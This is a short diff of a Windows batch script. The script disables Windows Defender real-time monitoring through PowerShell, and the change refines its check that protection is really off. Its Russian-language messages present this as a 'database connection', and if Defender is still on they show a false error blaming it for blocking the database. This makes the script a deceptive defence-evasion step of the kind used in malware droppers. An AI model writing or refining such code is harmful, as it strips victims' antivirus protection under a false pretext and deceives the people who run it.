@@ -17,8 +17,13 @@ if %errorLevel% neq 0 (
 
 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 
-powershell -Command "Get-MpPreference" | find "DisableRealtimeMonitoring" >nul 2>&1
-if %errorLevel% equ 0 (
+for /f "tokens=2 delims=:" %%a in ('powershell -Command "Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring"') do (
+    set "realTimeDisabled=%%a"
+)
+
+set "realTimeDisabled=%realTimeDisabled: =%"
+
+if "%realTimeDisabled%"=="True" (
     echo Соединение с базой данных
 ) else (
     powershell -Command "Write-Host 'Ошибка: Windows Defender блокирует соединение с базой данных' -ForegroundColor Red"
